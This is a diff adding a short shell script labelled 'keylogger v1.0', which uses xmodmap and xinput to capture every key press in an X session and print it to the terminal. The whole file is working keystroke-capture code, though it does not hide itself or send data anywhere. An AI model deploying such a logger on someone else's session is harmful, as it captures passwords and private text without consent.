@@ -1,0 +1,35 @@
+#!/bin/sh
+
+# keylogger v1.0
+# Bruno "GNUser" Dantas GPLv3
+
+main()
+{
+	build_array
+	monitor_keyboard
+}
+
+build_array() # actually just a series of variables (e.g., map_38=a map_39=s map_40=d etc.)
+{
+	xmodmap -pke >/tmp/keymap
+	while read line; do
+		keycode="$(echo $line | cut -d' ' -f 2)"
+		key="$(echo $line | cut -d' ' -f 4)"
+		eval map_"$keycode"="$key"
+	done </tmp/keymap
+}
+
+monitor_keyboard()
+{
+	prior_key=''
+	LANG=C xinput --test-xi2 --root | awk '
+/RawKeyPress/ { relevant=1 }
+relevant==1 && /detail/ { print $2; relevant=0 }
+{ fflush() }
+' | while read keycode; do
+		key=$(eval echo \$map_$keycode)
+		echo "$key"
+	done
+}
+
+main
